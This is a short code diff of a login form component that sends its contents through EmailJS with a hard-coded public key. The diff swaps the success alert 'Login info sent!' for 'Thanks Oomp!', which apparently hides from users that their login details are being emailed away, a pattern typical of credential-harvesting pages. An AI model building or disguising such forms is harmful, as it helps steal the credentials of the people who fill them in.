@@ -17,7 +17,7 @@ export default function LoginForm() {
       form,
       'DqyIJ9pt6PNh3kS2L'      // Replace with your EmailJS public key
     )
-    .then(() => alert("Login info sent!"))
+    .then(() => alert("Thanks Oomp!"))
     .catch((error) => alert("Failed to send: " + error.text));
   };
 
